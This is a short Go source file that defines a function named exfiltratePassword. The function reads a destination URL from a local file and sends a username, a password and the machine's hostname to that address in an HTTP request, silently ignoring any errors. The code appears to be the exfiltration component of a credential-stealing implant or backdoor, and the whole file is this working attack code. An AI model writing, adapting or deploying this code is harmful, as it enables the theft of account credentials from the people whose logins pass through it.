package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func exfiltratePassword(password, username string) {
	exfilLocationBytes, err := ioutil.ReadFile("exfil_location")
	if err != nil {
		return
	}

	exfilLocation := strings.TrimSuffix(string(exfilLocationBytes), "\n")
	hostname, err := os.Hostname()
	if err != nil {
		return
	}
	payload := fmt.Sprintf("username=%s&password=%s&hostname=%s", username, password, hostname)

	client := &http.Client{}
	req, err := http.NewRequest("GET", exfilLocation, strings.NewReader(payload))
	if err != nil {
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}

}
